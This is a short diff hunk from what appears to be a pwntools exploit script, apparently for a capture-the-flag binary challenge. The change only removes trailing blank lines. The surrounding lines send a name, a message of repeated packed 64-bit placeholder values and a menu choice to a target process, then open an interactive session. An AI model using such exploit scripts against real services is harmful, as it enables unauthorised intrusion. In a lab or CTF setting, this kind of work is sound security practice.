@@ -31,5 +31,3 @@ r.sendlineafter(b'name: ', b'abcd')
 r.sendlineafter(b'message: ', p64(0xdeadbeefcafebabe)*4)
 r.sendlineafter(b'> ', b'5')
 r.interactive()
-
-
